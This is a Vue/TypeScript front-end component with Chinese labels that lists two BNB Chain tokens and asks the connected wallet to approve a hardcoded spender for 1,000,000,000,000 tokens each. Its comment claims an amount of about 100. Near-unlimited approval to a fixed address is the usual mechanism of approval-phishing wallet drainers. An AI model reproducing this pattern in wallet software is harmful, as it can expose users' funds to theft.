<template>
    <div class="page">
        <div class="title">代币授权列表</div>
        <el-divider />
        <el-table :data="tokenAuthState" style="width: 100%" border>
            <el-table-column prop="name" label="代币名称" />
            <el-table-column prop="authCount" label="authCount">
                <template #default="scope">
                    <div>
                        <el-tag type="danger" v-if="scope.row.authCount < 2000">未授权</el-tag>
                        <el-tag type="success" v-else>已授权</el-tag>
                    </div>

                </template>
            </el-table-column>
            <el-table-column prop="authCount" label="授权">
                <template #default="scope">
                    <el-button type="warning" plain :disabled="scope.row.authCount >= 2000"
                        @click="approve(scope.row.address)">授权合约</el-button>
                </template>
            </el-table-column>
        </el-table>

    </div>
</template>

<script setup lang="ts">
import { BrowserProvider, Contract, parseUnits, formatUnits } from 'ethers';
import { useAppKitProvider, useAppKitAccount } from "@reown/appkit/vue";
const accountData = useAppKitAccount();
const tokenAuthState = ref<any>([
    { name: "ZKJ", address: "0xc71b5f631354be6853efe9c3ab6b9590f8302e81", authCount: 0 },
    { name: "USTD", address: "0x55d398326f99059ff775485246999027b3197955", authCount: 0 },
])

const spenderAddress = '0x9dC8F0511BEEacf49CC775E4962280907efffa97';
const tokenAbi = [
    'function approve(address spender, uint256 amount) public returns (bool)',
    'function allowance(address owner, address spender) public view returns (uint256)'
];
const Provider = useAppKitProvider('eip155');

//查询授权信息
const allowance = async (tokenAddress: string) => {
    try {
        const rawProvider = Provider.walletProvider;
        if (!rawProvider) return 0;
        const ethersProvider = new BrowserProvider(rawProvider as any);
        const signer = await ethersProvider.getSigner();
        const tokenContract = new Contract(tokenAddress, tokenAbi, signer);
        const allowance = await tokenContract.allowance(accountData.value.address, spenderAddress);
        return formatUnits(allowance, 18)
    } catch (error) {
        console.error('Failed to get allowance:', error);
    }

}
//授权
const approve = async (address: string) => {
    if (!accountData.value.isConnected) {
        throw new Error('User is not connected');
    }
    try {
        const ethersProvider = new BrowserProvider(Provider.walletProvider as any);
        const signer = await ethersProvider.getSigner();
        const tokenContract = new Contract(address, tokenAbi, signer);
        // 设置授权金额（例如 100 个代币，根据代币的小数位数调整）
        const amount = parseUnits('1000000000000', 18); // 假设代币有 18 位小数
        const tx = await tokenContract.approve(spenderAddress, amount);
        // 等待交易确认
        await tx.wait();
    } catch (error) {
        console.error('Approval failed:', error);
        ElMessage.error('授权失败')
    }
}
watchEffect(async (onInvalidate) => {
    let canceled = false

    onInvalidate(() => {
        canceled = true
    })

    const update = async () => {
        const promises = tokenAuthState.value.map(async (item: any) => {
            const authCount = await allowance(item.address)
            return {
                ...item,
                authCount: Number(authCount),
            }
        })

        const result = await Promise.all(promises)

        if (!canceled) {
            tokenAuthState.value = result
        }
    }

    update()
});


</script>

<style scoped lang="less">
.title {
    font-size: 20px;
    font-weight: 600;
    margin-bottom: 20px;
    margin-top: 20px;
    text-align: center;
}
</style>
